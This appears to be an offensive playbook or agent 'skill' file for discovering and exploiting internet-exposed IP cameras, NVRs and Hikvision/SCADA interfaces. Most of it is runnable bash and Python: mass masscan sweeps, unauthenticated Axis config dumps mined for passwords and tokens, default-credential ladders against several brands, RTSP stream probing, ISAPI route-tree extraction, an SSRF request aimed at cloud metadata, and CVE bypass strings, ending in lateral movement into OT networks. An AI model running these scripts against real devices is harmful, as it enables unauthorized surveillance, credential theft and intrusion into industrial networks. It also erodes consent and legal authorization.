---
name: IoT & OT Device Recon
description: Discover and exploit exposed IP cameras, NVR/SCADA web interfaces, RTSP/ONVIF services, and Hikvision ISAPI APIs via unauthenticated config dumps, default creds, and route-tree extraction.
tags: [iot, ot, camera, rtsp, onvif, hikvision, scada]
recommended_tools: [nmap_scan, httpx_probe, nuclei_scan, curl, http_request, python3, hydra_attack, execute_command]
vuln_classes: []
domain: network
phase: recon
provenance: {source: uphiago/recon-skills, paths: [recon/iot-camera-recon/SKILL.md, recon/scada-hikvision-isapi/SKILL.md]}
---

# IoT & OT Device Recon

IP cameras, NVRs, and SCADA/surveillance web interfaces are the most exposed IoT device class on the internet. This playbook covers discovery and exploitation of Axis, Hikvision, Dahua, Intelbras, and ONVIF devices: RTSP stream access, unauthenticated Axis config dumps (hundreds of parameters, no auth), ONVIF SOAP enumeration, default-credential testing, and Hikvision/HikCentral ISAPI route-tree extraction from JavaScript bundles. Most devices ship 4-6 year-old firmware with known CVEs and unchanged default passwords; ~15% of internet-exposed cameras still accept default creds.

## When to Use

- `nmap_scan` / mass scan finds RTSP (554/8554), ONVIF (8899), or camera HTTP ports (80, 8010, 8011, 8443, 9443).
- The target is a physical-security, traffic-management, energy, industrial, or government-surveillance operator.
- A server header or TLS certificate references Hikvision, HikCentral, iVMS, Axis, Dahua, or Pyramid.
- A web interface on a non-standard TLS port loads a large JS bundle referencing `/ISAPI/`, `Bumblebee`, or `Streaming/channels`.

## Prerequisites

- `curl` / `http_request`, `python3`, `nmap`.
- For mass scanning: masscan or RustScan (`--rate` tuned to network).
- ffmpeg/ffprobe or VLC for RTSP stream verification (optional but authoritative proof).

## Gate 0 — Deterministic Proof

Do not report a device as compromised on an HTTP 200 alone. Prove it:

- **Snapshot** MUST return a valid JPEG — verify with `file snapshot.jpg` (expect "JPEG image data"), not just a 200 code.
- **Config dump** MUST contain device-specific parameters (Brand, Model, SerialNumber, Firmware.Version). A generic HTML page is not a config.
- **RTSP stream** MUST produce decodable video frames — verify with `ffprobe` exit 0, not just a socket connect.
- **Default creds** MUST grant access to a protected endpoint: HTTP 200 *with* auth while the same request *without* auth returns 401.
- **ISAPI endpoint** counts as a finding even at ErrorCode 216 ("session required") — it proves the service is live and exposed, but distinguish "exposed" from "data leaked".

## Quick Reference — Brand Fingerprints

| Brand | HTTP Ports | Snapshot URL | Config / Info URL | Default Creds |
|-------|-----------|--------------|-------------------|---------------|
| Axis | 80, 8010 | `/axis-cgi/jpg/image.cgi` | `/axis-cgi/admin/param.cgi?action=list` | root:pass, root:admin, root:root |
| Hikvision | 80, 443, 554 | `/ISAPI/Streaming/channels/101/picture` | `/ISAPI/System/deviceInfo` | admin:12345, admin:admin |
| HikCentral | 443, 8443, 9443 | `/ISAPI/Streaming/channels/1/picture` | `/ISAPI/Bumblebee/...` (CAS auth) | admin:Hikvision123 |
| Dahua | 80, 554 | `/cgi-bin/snapshot.cgi` | `/cgi-bin/configManager.cgi?action=getConfig` | admin:admin, admin:password |
| Intelbras | 80 | `/cgi-bin/snapshot.cgi` | `/web/cgi-bin/hi3510/param.cgi` | admin:admin, admin:123456 |
| ONVIF | 80, 8080, 8899 | SOAP only | `/onvif/device_service` | admin:admin |

## Phase 1 — Mass Discovery & Fingerprinting

Sweep RTSP + camera HTTP ports, then probe each hit. RTSP frequently rides UDP — a pure TCP scan misses it (`nmap -sU -p 554`).

```bash
RANGE="$1"                 # e.g. 187.141.0.0/16
OUTDIR="./out/cameras"; mkdir -p "$OUTDIR"

# Mass sweep for RTSP + camera HTTP/ONVIF ports
masscan -p554,80,443,8010,8011,8443,8899 --rate=50000 "$RANGE" \
  -oJ "$OUTDIR/masscan.json"

# Collapse to unique IPs
python3 -c "
import json
ips=set()
for line in open('$OUTDIR/masscan.json'):
    line=line.strip().rstrip(',')
    if not line or line in '[]': continue
    try: ips.add(json.loads(line)['ip'])
    except Exception: pass
print('\n'.join(sorted(ips)))
" > "$OUTDIR/ips.txt"
```

Fingerprint each host. Axis leaks a full config dump with no authentication — this is the single highest-value finding in the class:

```bash
while read ip; do
  echo "--- $ip ---"

  # Axis unauthenticated snapshot
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 \
    "http://$ip:8010/axis-cgi/jpg/image.cgi")
  [ "$code" = 200 ] && echo "  [AXIS] snapshot: http://$ip:8010/axis-cgi/jpg/image.cgi"

  # Axis full config dump (no auth) — pull brand/model/firmware/serial
  cfg=$(curl -sk --max-time 5 "http://$ip:8010/axis-cgi/admin/param.cgi?action=list")
  if echo "$cfg" | grep -q "root.Brand"; then
    echo "  [CONFIG] $(echo "$cfg" | grep 'root.Brand.Brand='       | cut -d= -f2 | tr -d '"') \
$(echo "$cfg" | grep 'root.Brand.ProdShortName='          | cut -d= -f2 | tr -d '"') \
FW=$(echo "$cfg" | grep 'root.Properties.Firmware.Version=' | cut -d= -f2 | tr -d '"')"
  fi

  # ONVIF device info (SOAP) on common ports
  for port in 8899 80 8080; do
    resp=$(curl -sk --max-time 5 -X POST "http://$ip:$port/onvif/device_service" \
      -H "Content-Type: application/soap+xml" \
      -d '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>')
    echo "$resp" | grep -qi "manufacturer\|model\|serial" && echo "  [ONVIF] device info on :$port"
  done
done < "$OUTDIR/ips.txt"
```

Run `httpx_probe` for TLS-cert / server-header fingerprinting and `nuclei_scan` with the `-tags iot,camera,hikvision,dahua` template sets for known-CVE coverage.

## Phase 2 — Axis Full Exploitation

```bash
IP="$1"; base="http://$IP:8010"

# Snapshot (proof-of-view)
curl -sk --max-time 5 "$base/axis-cgi/jpg/image.cgi" -o "axis_snap.jpg"
file axis_snap.jpg   # must be "JPEG image data"

# Full config dump — commonly hundreds of parameters, unauthenticated
curl -sk --max-time 10 "$base/axis-cgi/admin/param.cgi?action=list" -o axis_config.txt
echo "params: $(wc -l < axis_config.txt)"

# Mine sensitive parameters (creds, tokens, licenses, network config)
grep -iE 'password|user|token|key|serial|license|cert|network\.eth0\.IP' axis_config.txt

# Live MJPG stream (short probe, then kill)
timeout 3 curl -sk "$base/axis-cgi/mjpg/video.cgi" -o axis_stream.mjpg
[ "$(stat -c%s axis_stream.mjpg 2>/dev/null || echo 0)" -gt 1000 ] && echo "[+] live MJPG captured"

# Enumerate exposed service groups
for svc in admin viewer operator ptz applications local; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "$base/axis-cgi/$svc/")
  [ "$code" != 404 ] && [ "$code" != 000 ] && echo "  service: /axis-cgi/$svc/ ($code)"
done
```

## Phase 3 — Default-Credential Testing

Brand-specific ladders against a known protected endpoint. A `200` with auth (vs `401` without) is the deterministic tell. Automate at scale with `hydra_attack` (http-get / http-form-post modules).

```bash
IP="$1"; BRAND="${2:-axis}"
case "$BRAND" in
  axis)      CREDS=(root:pass root:admin root:root root:12345 admin:admin);
             URL="http://$IP:8010/axis-cgi/admin/param.cgi?action=list";;
  hikvision) CREDS=(admin:12345 admin:admin admin:123456 admin:password Hikvision123);
             URL="http://$IP/ISAPI/System/deviceInfo";;
  dahua)     CREDS=(admin:admin admin:password admin:123456 admin:admin123);
             URL="http://$IP/cgi-bin/snapshot.cgi";;
  intelbras) CREDS=(admin:admin admin:123456 admin:password admin:admin123);
             URL="http://$IP/cgi-bin/snapshot.cgi";;
  *)         CREDS=(admin:admin admin:12345 root:admin admin:password); URL="http://$IP/";;
esac
for c in "${CREDS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 -u "$c" "$URL")
  [ "$code" = 200 ] && echo "  [CRITICAL] DEFAULT CREDS: $c"
done
```

## Phase 4 — RTSP Stream Access

Always use TCP transport (`-rtsp_transport tcp`); UDP is unreliable for testing. Iterate common paths, then retry the working path with default creds.

```bash
IP="$1"; PORT="${2:-554}"
STREAMS=(/live /stream /cam/realmonitor /h264 /h264/ch1/main/av_stream
  /Streaming/Channels/101 /ISAPI/Streaming/channels/101
  /axis-media/media.amp /onvif1 /onvif2)

for s in "${STREAMS[@]}"; do
  if timeout 3 ffprobe -v quiet -rtsp_transport tcp "rtsp://$IP:$PORT$s"; then
    echo "  [LIVE] rtsp://$IP:$PORT$s"
  fi
done

for c in admin:admin admin:12345 root:pass; do
  timeout 3 ffprobe -v quiet -rtsp_transport tcp "rtsp://$c@$IP:$PORT/live" \
    && echo "  [CRITICAL] RTSP with $c"
done
```

## Phase 5 — Hikvision / HikCentral ISAPI Enumeration

Hikvision devices and HikCentral Professional expose a rich REST/XML API at predictable `/ISAPI/` paths. The web client embeds the **complete route tree** in its JavaScript bundles (`Common/common.js`, `components.js`, `vendorGraph.js`) — extract it before brute-guessing.

```bash
BASE="https://TARGET:PORT"
curl -sk "$BASE/" | python3 -c "
import sys, re, requests, urllib3
urllib3.disable_warnings()
html = sys.stdin.read()
for js in set(re.findall(r'(?:src|href)=\"([^\"]+\.js[^\"]*)\"', html)):
    url = js if js.startswith('http') else (f'$BASE{js}' if js.startswith('/') else f'$BASE/{js}')
    try:
        r = requests.get(url, verify=False, timeout=10)
        paths = sorted(set(re.findall(r'/ISAPI/[A-Za-z0-9_/]+', r.text)))
        if paths:
            print(f'\n{url} ({len(r.text)} bytes):')
            [print('  '+p) for p in paths[:40]]
    except Exception: pass
"
```

Probe extracted paths unauthenticated. ErrorCode 216 = "session required" (live but authed); still a finding.

```bash
ISAPI_PATHS=(
  /ISAPI/Bumblebee/Platform/V0/KeepLive
  /ISAPI/Bumblebee/Platform/V0/CAS/SlaveSession
  /ISAPI/Bumblebee/Platform/V1/SystemConfig/SceneConfig
  /ISAPI/Bumblebee/DeviceResource/V1/PhysicalResource/Devices/
  /ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig
  /ISAPI/Bumblebee/Platform/V1/Permission/Security/UserPermission
  /ISAPI/Bumblebee/Platform/V0/RSM/Sites/
  /ISAPI/Streaming/channels/101/picture
  /ISAPI/ContentMgmt/StreamingProxy/channel/
  /ISAPI/ContentMgmt/download
)
for p in "${ISAPI_PATHS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET:PORT$p")
  echo "$p -> $code"
done
```

Authentication paths differ by deployment: **HikCentral** (web-managed) uses CAS `SlaveSession`; **standalone NVRs/cameras** use Basic or Digest. The auth method itself fingerprints the deployment type.

```bash
# CAS session login (HikCentral)
curl -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/CAS/SlaveSession" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<SessionLogin xmlns="http://www.isapi.org/ver20/XMLSchema" version="2.0">
  <userName>admin</userName><password>PASSWORD</password>
  <sessionList><session><id>1</id></session></sessionList>
</SessionLogin>'

# Basic-auth password ladder against a live endpoint
for pw in admin 12345 123456 password admin123 Hikvision123 hikvision; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/KeepLive" -u "admin:$pw")
  [ "$code" != 401 ] && echo "admin:$pw -> $code"
done
```

### High-value ISAPI endpoints (prioritize)

- **`/ISAPI/Bumblebee/Platform/V1/DAM/HTTPPassThrough`** — server-side HTTP pass-through. Point it at `http://169.254.169.254/` (cloud metadata) or an internal host to test for **SSRF** (CWE-918).
- **`/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig`** — cloud-storage credentials/config exposure.
- **`/ISAPI/Bumblebee/Platform/V1/Permission/Security/UserPermission`** — user/permission enumeration.
- **`/ISAPI/Bumblebee/Platform/V0/RSM/Sites/`** — remote-site management (lateral pivot into managed devices).
- **`/ISAPI/ContentMgmt/download`** — recorded-footage retrieval.

```bash
curl -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/DAM/HTTPPassThrough" \
  -H "Content-Type: application/json" -d '{"url":"http://169.254.169.254/"}'
```

## Notable CVEs / Chaining

- **CVE-2017-7921** (Hikvision) — improper auth: appends `?auth=YWRtaW46MTEK` to bypass authentication on `/System/configurationFile` and stream endpoints, dumping the full config incl. credentials. Test on any Hikvision device before assuming auth is enforced.
- **CVE-2021-36260** — Hikvision unauthenticated command injection (RCE) in the web server; many exposed devices remain unpatched.
- **CVE-2017-7925** (Dahua) — config-file password disclosure via `/current_config/passwd`.
- **Chaining:** Axis/Hikvision config dump -> plaintext or reversible creds -> RTSP/ISAPI full access -> `RSM/Sites` or ONVIF -> lateral movement into the managed camera fleet / internal OT network. `js-secrets-extraction` on the JS bundles often yields API keys that authenticate ISAPI requests directly.

## Pitfalls

- **CGNAT hides internal fleets.** Carrier-grade NAT makes many devices unreachable directly from the internet even when the org's internal network is fully exposed — pivot from a foothold.
- **RTSP is UDP-first.** TCP-only port scans miss it; scan `nmap -sU -p 554` and always test streams with `-rtsp_transport tcp`.
- **ONVIF is not always 8899.** Probe 80/8080/8443 with the SOAP request too.
- **Config dumps are large (50-200 KB).** Cap with `--max-time` to avoid hanging on slow links.
- **Firmware is ancient.** 2020-era firmware on a 2026 scan is normal — never assume a device is patched against its known CVEs.
- **ErrorCode 216 ≠ dead.** It means the endpoint is live and requires a session — a valid exposure finding, distinct from a leaked-data finding.

## Verification

1. Snapshot decodes as a real JPEG (`file`), config dump contains brand/model/serial/firmware, RTSP yields frames (`ffprobe`).
2. Default creds prove access: 200 with auth vs 401 without on a protected endpoint.
3. ISAPI: at least 5 endpoints respond; document the full JS-extracted route tree and which endpoints leak data unauthenticated.
4. Record every exposed field: brand, model, serial, firmware version, network config, credentials, and reachable stream/storage/permission endpoints.
